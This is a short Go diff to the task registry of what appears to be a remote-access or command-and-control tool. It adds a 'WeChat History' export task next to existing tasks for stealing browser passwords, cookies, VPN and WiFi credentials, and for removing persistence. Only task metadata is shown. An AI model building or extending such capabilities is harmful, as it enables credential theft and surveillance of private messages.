@@ -169,6 +169,7 @@ func init() {
 		{Type: TaskTypePersistenceRem, Name: "Persistence Remove", Description: "Remove persistence mechanism", Category: "persistence",
 			Parameters: []TaskParam{{Name: "command", Type: "string", Required: true, Description: "Persistence ID"}}},
 		{Type: TaskTypeBrowserSteal, Name: "Browser Steal", Description: "Steal browser passwords", Category: "credential-access"},
+		{Type: TaskTypeWeChatHistory, Name: "WeChat History", Description: "Export WeChat chat history", Category: "collection"},
 		{Type: TaskTypeCookieExport, Name: "Cookie Export", Description: "Export browser cookies", Category: "collection"},
 		{Type: TaskTypeVPNCreds, Name: "VPN Credentials", Description: "Extract VPN credentials", Category: "credential-access"},
 		{Type: TaskTypeWifiCreds, Name: "WiFi Credentials", Description: "Extract WiFi credentials", Category: "credential-access"},
